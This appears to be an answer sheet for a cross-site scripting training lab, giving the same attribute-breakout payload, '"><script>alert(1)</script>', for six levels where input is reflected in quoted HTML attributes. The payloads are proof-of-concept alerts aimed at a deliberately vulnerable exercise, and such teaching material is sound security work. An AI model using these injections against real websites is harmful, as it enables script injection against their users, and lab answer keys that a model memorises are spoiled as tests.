# globalattr — solutions

Reflection in various global HTML attributes (`id`, `class`, `accesskey`, `spellcheck`, `draggable`, `lang`) — all double-quoted, break out and inject.

### globalattr-level1

`/globalattr/level1/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<div id="...">` — break out

### globalattr-level2

`/globalattr/level2/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<p class="...">` — break out

### globalattr-level3

`/globalattr/level3/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<span accesskey="...">` — break out

### globalattr-level4

`/globalattr/level4/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<div spellcheck="...">` — break out

### globalattr-level5

`/globalattr/level5/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<p draggable="...">` — break out

### globalattr-level6

`/globalattr/level6/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<div lang="...">` — break out
